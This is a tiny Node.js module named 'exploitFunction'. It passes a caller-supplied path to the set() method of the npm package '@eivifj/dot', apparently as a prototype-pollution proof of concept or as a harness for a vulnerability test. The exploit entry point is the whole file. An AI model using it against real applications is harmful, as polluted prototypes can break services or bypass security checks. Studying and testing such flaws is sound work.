function exploitFunction(payload) {
    const a = require("@eivifj/dot");
    const path = payload.path;
    a.set({}, path, "yes");
}

module.exports = { exploitFunction };